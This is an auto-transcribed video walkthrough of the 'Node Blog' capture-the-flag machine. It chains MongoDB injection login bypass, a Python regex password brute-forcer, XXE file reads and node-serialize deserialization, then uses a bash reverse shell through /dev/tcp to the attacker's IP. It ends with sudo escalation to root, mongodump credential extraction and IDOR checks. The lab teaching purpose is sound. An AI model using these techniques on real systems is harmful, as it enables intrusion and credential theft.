 what's going on youtube this is ipsec we're doing node blog which is a machine i created for the uhc december qualifiers and as the machine's name suggests it is a blog written in nodejs using the express framework the main thing i wanted to highlight in this box was nosql and mongodb injection because a lot of people or automated scanners will miss this type of vulnerability for whatever reason so i wanted to highlight that but a box isn't just one vulnerability i had to chain a few together so once we bypass the login parameters with that mongodb injection we can upload blog post in the form of xml so there's xml any injection there that can leak the source code to the web application and with that source code you see the application uses a library node serialize which is vulnerable to deserialization and we can do that to get code execution on the box once on the box we just use the password for the web user to s you to root but it's not so easy because it's not in a sql database so i imagine a lot of people will have trouble finding it with that being said let's jump in as always we can begin with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it node blog and then the ip address which is 10 129 96.160. this can take some time to run so i've already ran it looking at the results we see just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server we also have http on port 5000 and it's running node js specifically the express framework which is just a framework for nude think of it like flask or django for python larval or cake php for php um every language has its own framework like elixir is for erlang but you can go on for hours there so let's just go take a look at the website so 10 129 96 160 port 5000 and we just get a simple blog we can click on the first person that says uhc qualifiers which is what this box was created for and it gives the links to a bunch of their media information we can look at my first node app that just gives a little background of this application i had created it after watching the tutorial here and i put a lot of the vulnerabilities that i first discovered when doing the sans holiday hack 2015 so if you wanted to look at more vulnerabilities you got stuck and didn't want to use this video you could always go there to kind of get an idea what to do there's not much we can do here we look at articles and it's not giving us like a unique identifier if i saw like um index.php question mark post equals one i would try some type of sql injection there but we have some pretty uh search engine optimized friendly urls so it's kind of hard to do sql injection in this we can try going to the login and logging in with let's say admin admin and we get invalid passwords so we can try like admin password still invalid it is telling us invalid password specifically so let's try something that probably doesn't exist like please subscribe and put password and we get invalid username so right off the bat we have the first vulnerabilities application and that's the ability to enumerate usernames you can try this with all fields like forgot password is a common one nowadays but we can try logging in with some basic sql injection so like or one equals one and we get invalid password another place i do it is probably in this username field because when i do admin password here we get invalid password so i could try admin and then a quote or a comment and we get invalid username so we know it did not process this comment so it's a quick way we can test for sql injection but this is node.js and a lot of node.js applications don't use sql php is common with the lamp stack but for node.js it is all about the main stack that is um mongodb then express angular and node.js i believe so mongodb is a new sql like database and it's still vulnerable to injection it's just slightly different you got to combine it with like a type confusion vulnerability so to do that let's go over into burp suite and i'm going to try logging in with admin admin and let's see burp suite was set to not intercept so let's try this again admin admin it's over on burp we can send this over to the repeater tab and one of the tricky things with this is um you got to do type confusion and a lot of times you can't do it in this um xw your form url encoded so it would be something like this not equals to admin and we still get invalid password what we're doing here is transforming this query to say where the username is admin and the password is not equal to admin but a lot of the web servers just don't really allow you to put um scalars or arrays whatever this is in the url form however this is node.js and we can convert this quickly to be javascript or json not javascript um and then all we have to do is change how this parameter works to make it json so user is equal to admin and then password is equal to admin like this and then when we send this uh we do have an error message because let's see where did i screw up user colon oh i don't have this but we could read this error message we'll get more into this later this is also really good for attackers because we know where the application actually is running and some example files but we'll look at that later on this video so fixing up the json if i forgot the quote we can see invalid password if i put something that doesn't exist we get invalid username so we know this is working as intended so let's try this type confusion vulnerability again and for the password i'm going to put more json and we're going to say not equals to admin and let's see we forgot to terminate this json object and we don't we have something different now we don't have invalid password and it's giving us a cookie to set so we have successfully um logged into this application by saying username equals admin and the password is not equal to admin there's other things we can do within nodejs or mongodb not node.js one of them being regex so instead of this not equals we can change it to regex and we could say is equal to anything dot star and we still log in if we put something bad here like asdf because that's not the password we get invalid password if you want to know more about that i would just recommend um looking at like mongodb search for ne if we actually google it and you go to the mongodb man pages and then you can click on like operators or uh let's see this query and projection operators and we see all these that we can do so we can do like equals greater than greater than or equal to so this would be good if you're like converting each character into its um hex number because then you can do greater than less than and speed up brute forcing um you got logical operators like and not nor or uh let's see evaluation this is the regex one we are using so you can look up all the little operators you could use but really not equals and rag x are the two most popular because with not equals you can just log into the application but if you actually want to get the password regex is where it's at because now we can do begins with something and then brute force a bunch of characters and when this is true it will log us in so let's build a quick python application to do this i'm going to call this login.pi i guess and we're going to want to import uh requests and let's see first we just want to make sure we get a request working so i'm going to do def login pw and then for this we need to do some nested json so i'm going to put we'll call this payload is equal to and normally i'd use like an f string or format string whatever it's called but i'm not going to do that because i'm putting raw json here and then which requires using these brackets which is going to screw with this f string so let's do is it regex colon and we just want something that matches everything uh actually this is a function so i'm just going to do percent s and what that's going to allow me to do is percent here and pw and it's going to put pw in this percent s so let's just try this real quick return payload and we can say um let's say login ipsec and then python3 login.pi uh let's see we should probably print that there we go so now we have successfully put something into this so now what's next is building the rest of this request so um data is going to equal and we can just put this as json so is it user username user user is equal to admin and then password is equal to payload and then let's return data and the one thing i can spot right off the bat is python is putting quotes around our json so if we went here and we put quotes around this it's gonna error because it doesn't like something so we don't want quotes around that what we can do with that is input json and then this payload we can just say json.loads and tell it you are not a string so now when i print this we don't have the single quotes before this we can see the single quote there it's not there so that is probably one of the key things here so now we just have to do the request so r is equal to request.post and the url http uh let's grab and paste this i have http twice there we go and instead of data is equal to data i'm going to do json is equal to data and that's going to tell python to use this as json and automatically sets that header for us so we don't have to do that and then we can say if and look for invalid password so here it is if invalid password i probably don't need all those spaces or tabs in response.txt return false and then we can return true here i could have put that in an else statement but um if i did that i'd have this weird um if clause and just my personal habit i hate like the function not always returning like maybe there's some super weird edge case where this if i don't know i just normally don't use else if it's at this very end because if the function is an invalid password i want to return true i don't know that may be a personal thing hopefully that makes sense why i didn't use the else there or it's not overly confusing why didn't but yeah so we can say if login ipsec uh we can put um do dot star because this should return true print success so when i run this it's gonna hang that's not right let's see request dot post 10 129 96 160 5000 login say login test it should just do nothing i wonder where it's hanging is my vpn down no i can get to it 10 129 96 160. let's see http colon slash 10 129 96 160. this is weird uh we can say proxies is equal to http and then http 127.001 and we'll send this over to rip suite so proxy is equal to proxies let's go to burp suite reset intercept run this again and i forgot to do port 8080. okay we are in here and it is indeed hanging but it's not hanging here user agent do i need the referral i can't imagine i need that let's see user admin password oh i have a q not a g that actually hung it wow let's see what is this regex i don't know how i made that typo but at least we have some debugging in here to see exactly how i go about this if i make an error but that looks better we got invalid password so we can take this proxy off because we don't want it to keep slowing us down so we run this we don't have success but if i change this to dot star now we have a success because it did not find invalid password so with this now we can create a brute forcing loop so let's go up to the top and i'm going to import string i'm also going to import sys because you'll see this allows me to do something very just like visually appealing but the string is going to easily let me loop through all characters so um let's just show real quick python3 import string and i can do print string dot ascii letters and it just puts all the letters here so let's do a loop here so while stop is equal to false and we just want to make stop equal to false to begin with and i also want to set password is equal to carrot because in regular expression this means starts with so i always want to make sure when i'm brute forcing this password that i'm at the very beginning of the string so that's why i do this the reason for this loop is because i want to brute force each character and this is just a lazy way to do it this is all going to be really bad code so you should probably clean it up yourself but as long as it works it's good so for i in string dot ascii letters and then for here we're going to [Music] um do assist standard out dot write and i'm going to start it with a line break because this is going to essentially do a flush i believe and then we can say password and then i so what this is going to do is print out the password that we're going to attempt and we're going to attempt starts with right now and then a letter so if login and we can do the same thing password i then we have successfully um logged in so what i'm going to do is say password is equal to a plus equals to i which is going to append that letter to password and then break and this should start working uh we probably want to um no we don't have to flush or anything this will work but i think it has a few issues the first one being bad syntax so this we just need to do f like that and we'll see if it gets the first two characters and once it gets the first two characters we'll move on and clean it up so we the very first one is i the second one is p so we can see it is indeed working but the issue is it's never going to stop once it hits that final character it's just going to go into a forever loop so what i want to do is upon a success i'm going to do a second login so if login we just want to do password because we've already appended it and then we do a dollar sign which in regular expressions is end of string so if that then we can do cis standard out dot write the password like that we can flush i don't know if we have to flush because we're putting the line break at the end but just have it and then break and we also want to say stop is equal to true so this should work um let's see actually let's do python3 login.pi so you can see it working and while it goes we will just explain it before i speed up the video so right here we're just doing um our login thing to brute force here we're setting passwords is equal to um the start of the string this is going to be our forever loop we tell it to stop when we want to and then here we're looping through every ascii character um if i was doing this i would also combine like ascii symbols and things like that but i have the power of foresight here and no the password didn't have any symbols so that's why i just left at ascii letters so it says uh so it stays pretty quick this is just printing it out and we're doing cis standard outright so we can make it do this little graphic thing instead of just printing a bunch of lines i think it looks pretty cool and you know it's working if it hangs you know it's hung here we're just testing the login by trying password and then whatever character we are on in this ascii letters loop if it's success then we append that letter to the password and test it again with um the dollar sign because that's going to say the string ends with that and then if it does we're just going to end the program and we set stop equals to true so hopefully the program stops and i notice i had a bug here it's doing what i said it would do it's just continuously loop at the end and there could be like a symbol here that's just not in earth like word list but what's actually happening is when i converted this to be an f string i did not do that so um this was actually every time it got a successful hit it actually tried logging in with password like the word not the variable so that was that bug i'm going to run this again we're going to speed up the video to get to the end so you can see it does work as intended or so i can see it does work as intended so um be right back and there you have it the password is ipsec says please subscribe so now we can log into this application two different ways we can either just do the uh bypass so if i go here burp suite if we go to proxy attempt to log in you can send it over to repeater and um see that was probably the bad one forget what was wrong with it let's see here this is the payload we want oh it was regex with a q i don't know how i did that but we could log in with this and say it's not equal not regex and do json and i think this will work yep so we're logged in we have some more features we can also delete a cookie and log in with just the password so go back here log in and we can say admin and ipsec says please subscribe and log in that way so two different ways to log in now we have the ability to um edit articles so we could potentially edit this or delete we also have this upload functionality so if i click on upload uh let's just create a test file so this is node.js not php so that's why i'm not going to try a php web shell i'm just going to do test.text and put stuff in here so let's go here so let's do hdb uhc that was node blog here or uhc no block there we go so we can try uploading test.text and we don't really get anything but this is the application erroring out and telling us what the example format is so this is a xml upload form so it's just giving us test xml so what happens if we uploaded a xml document so let's do test.xml put in their example and then let's just go back upload let's see login i don't know if i should have logged in again let's click upload there we go there's some weird caching issue there i think but test.xml and it starts creating the article for us and we can save it and i think it saves maybe it doesn't i'm guessing the save article is broken but the key thing is it's putting data from that xml form so let's actually try putting xml any injection here so what i'm going to do is payload all the things then xxe i'm going to search for a good payload i always just go to payload all the things because i mean this is the place i like best for finding proof of concept scripts and all we do is let's copy this um let's see i was hoping to find this first for doing xxe i always like not using files first because if something like app armor is installed it's a potential that it blocks us from accessing slash etsy so i like doing just the basic uh vanilla payload without any um funny business so we can do whoops that and example i'm going to call this please subscribe and we'll put it in the description because description is probably the uh biggest field and all we do is and replace semicolon i think if i look at this post again yep and variable semicolon so let's try uploading this xml file so i'm going to go back to the blog let's go back upload i don't know why it's doing that i probably should fix this i think i fixed this bug on uhc but uhd is on aws hack the boxes on vcenter i think i forgot to pour patch this bug fix back to this box but we can upload test.xml and it did not work let's see if i hit 5000 not login there we go so let's see maybe this has to be one line and it was description so upload this look at the source and the fact that it's outputting the um example uh we have some type of error so i'm gonna try getting rid of this header and we'll just start with this doctype and see what happens with this let's see doctype that's closed okay let's try this one so let's go back here 5000 upload xml and it's still erroring out so what i'm going to do is the crazy thing i'm going to complicate the payload oh wait it's example not replace shoot let's put this back and end the example so let's try example here go back upload there we go so that was it if i go here upload test.xml we have description as please subscribe so i was just um screwing up with my xml any injection i read replace and put replace here when the nd is actually example okay so now we confirmed it is xml any injections we can go with the more complicated route and that is just putting a file so let's go here delete all of this paste this in and it's entity test so let's make sure we put test here and the weird thing is like my browser it's remembering i selected this test.xml and automatically putting it in so maybe it wasn't a bug in um the web application it was just my browser doing something weird with caching if i refresh this page then click upload it'll ask again so we can see it is now giving us the um etsy passwd file now remember back a while ago we had induced an error message by putting in bad json here or something so let's just do that again and we can see unexpected token and it's telling us the application is in opt blog now here we have to guess what the actual um main file is and generally it's going to be like app.js server.js main.js it's normally those three if you went back and viewed this blog post and watched the video you'll know it's server.js but for that it's a very light brute force of file names but generally speaking they'll always be one of those three so opt blog server.js and for a lot of like node.js applications they like using server.js for a lot of python they like using app.pi um it's just all up to developer but now we have updated test.xml and we have the source code to um server.js so i'm going to make dir src we'll go in here and do vserver.js and paste it and looking at all the imports which are these things we can see it's using this node serialize module which doesn't look that bad if we just go google node serialize we can go to npm which is its package manager we'll probably have to disable burp suite and it will just tell us it's just a module that does serialization i want to say somewhere it gives us a warning if we go to versions we can see our version 004 and the last seven days has been downloaded 421 times we can look at just the graph of how common this is but if we go back a few pages let's see node serialize here we go this one on snek or however you pronounce that my browser is freezing not wanting to click there we go we can see it has a code execution path so if we can see where this serialize module is being used and we pass it this nd function parameter we can actually get it to execute code so let's take a look at where serialize is used so i'm just going to do a search on serialize so i'm going to get out of visual mode there we go and we can see this function authenticated it's serializing the cookie so probably should have used the json.parse the secure way to do this would be probably c is equal to json.parse and then guessing json.stringify c i think this would do pretty much the same thing this node's unserialized module is doing and i just say json because if we look at the cookie let's see uh do i have a cookie here we can see this cookie is indeed json go to decoder smart to code there we go so we have user admin sign and then a hash if we looked at the source we can see the hash is literally just combining the cookie secret which is up at near the top and the username and creating an md5sum so uhc-secretcookie so all it's doing is echo dash n uhc secret cookie i think that's how i typed it admin md5 sum we can see 2 3 e 1 1 and here we have 2 3 e 1 1 so that's how it's actually making the cookie secret i did not save let's go back to the application copy paste there we go so i missed what i edited here but you have the json.parse so all we have to do is put the desolation function in the cookie and we should have code execution so let's do that let's go back to the proxy or repeater let's just do a new request on slash and we'll send this over to burp suite make sure bip suite isn't intercepting anything and intercept is on send this request get a repeater and all we want to do is change this cookie the first thing i'm going to do is on url and code this to see if it still works it does and that just saves us a step and i'm just going to put it uh we can put it anywhere actually right we don't have to put it in the username we can just also do it here um call it please subscribe it doesn't really matter what it's called and all we do is put this payload here so let's copy this let's see where do i want to copy from i just want to copy probably this right and defunct up until that single double quote there we go so we have this and we can try a sleep i always like doing sleep first so this is doing ls on slash so i'm gonna do sleep five and if this takes five seconds to load we'll be good if it never comes back to us i'm gonna guess we have some type of syntax error and i'm going towards the syntax error route now because we're stuck on this waiting thing so i'm just going to try changing these quotes to be double quotes to see if that fixes it we are already escaping them so we don't have to really worry about that and still have an error let's see so we have user sign comma then please subscribe where is our error message i don't like that burp suite is um changing this highlighting but i guess that's the semicolon right here so what i'm going to try doing we'll get rid of this send and it works without the serialization so instead of sleep 1 i'm just going to do um we can try netcat 10 10 14 8 port 9001 and see if it connects back to us and it does not so we have some type of error that we just don't know try putting these back to single quotes come on send it again still not working the other thing i could try is url encoding this whole thing so convert sex selection url and code i'm just gonna do all characters send and we don't let's do ctrl shift u to unurl encode and we can try changing those quotes yet again and seeing if it works let's do url and code this entire thing url all characters it comes back and we get a connection so that is good i'm going to try this sleep again real quick so let's try sleep one and encode this whole payload so convert selection url all characters and it's not sleeping so this request is going off in the background so it's not waiting for it to end so this is why sleep here just does not work i'm sure there's other like payloads we could do that doesn't background this request and then sleep would then be a good way to do it but for this payload i think it's doing it asynchronously so sleep does not i hate when burp does that one of the previous requests finished and it rewrote my uh output so let's just do this unurl encode it so we definitely want double quotes and we can put our bash one line right here so i'm just gonna put text there and let's create a bash one liner so echo dash n bash dash i this dev tcp 10 14 8 9 000 1 0 and 1 base 64. and when i do this in web requests since i know your encoding is going to be a pain i'm going to get rid of that plus so i'm gonna guess the plus is after this i i'm just gonna put a space and it changes that slightly we have another plus right here i'm gonna guess that's before this o and let's see that is good i could have swore i would have to do something different but maybe not let's just test this payload real quick nclvmp 9001 and all we do is echo dash n base64-d pipe it over to bash and it looks like it works so huzzah let's copy and prep sweet did this again how annoying we can paste that the reason why i didn't do this like bash payload straight off and i put it in this base64 web cradle thing is um because it has so many bad characters and base64 removed a lot of them i think this is not gonna work because prep sweet went ahead and put single quartz back let's see yeah so let's change these back to double quotes this and then where's that last one here there we go copy this whole payload convert selection url and code all characters we are still listening send it and we get a shell awesome so i'm going to do python 3 dash c import pty pty dot spawn bin bash control z sdty raw minus echo fg hit enter twice and now we have like tab auto complete and things like that we notice that we are the admin user and if you remember back at the start of the video uh we had got admins password so let's just try sudo l it wants the password for admin which is ipsec says please subscribe and we can see we can run sudo and it's just a simple priv esque like that now if you did not dump the password and you just went through this box with that not equals to this could be a bit tougher there is a utility called dump that we can use and that should be able to dump the database so let's try playing with that uh the first thing i want to do is cat server.js and we want to do um localhost blog so copy this and then let's just go dev shm  dump do i have it on the box i do oh we don't even need to know anything i can just literally run mongodump as admin and then we go to blog and we have um articles.bson if i cat articles.bson we can see the file by cat users dot bson we can see user name admin password ipsec says please subscribe there's got to be a way to view bsun files i don't know exactly what that is um this is the metadata for it i was just saying exactly what it said but let's see view bson file google disable burp see mongodb bsundom hey i have it on this box users.bson there we go so this dumps it in a format that we can read if i had jq on this box we could further make that pretty so echo dash n let's put it in single quotes and then jq dot and we can get it in this format so that's the other way we could have got this password if we want to do something more tough articles on actually bsun dump articles copy this i don't know how this one's going to work let's see bsundump base64 w0 and we'll copy all this text two objects found okay v articles.bsun.b64 paste base64 d j q dot and there we go so a more pretty version of dumping the articles so apologies for the sloppy cut after recording the video i realized there was one more thing i wanted to show and that is eye door vulnerabilities are rampant in this application that's insecure direct object reference and it's something a lot of pen testers i think miss because they find all the vulnerabilities but don't find exactly how easy they are to trigger for example in this application we have this upload piece and this was locked behind a login however if we looked at that all that upload piece was let's see is a post to articles xml right and all we know is we logged in and we see this button so i would generally test either by invert suite doing this putting it in repeater and just removing the authentication so this is getting the etsy passwd if i remove the cookie it still works and we can get the xxe so we don't even need authentication to do this if we were just brute forcing um endpoints we may stumble across the xml under articles and be able to do it that way pretty much everything in the application is accessible without authentication the only piece it uses authentication for is display so if i go to this edit thing and we try editing let's do please subscribe i'm not sure if you can edit any of the default post i know i had prevented that but i'm not sure in this version if i did so it looks like we can edit this so what i'm gonna do go to this edit page let's remove the cookie so i'm just going to delete this we refresh this page we're still here and we can say i did this without auth we save it go back to all articles and we can see we did it without any type of authentication so either vulnerabilities is something you should definitely be testing for just because sometimes developers are lazy especially me and we just wrap authentication i mean around the actual display component so with that being said i'm gonna conclude this video hope you guys enjoyed it take care and i will see you all next week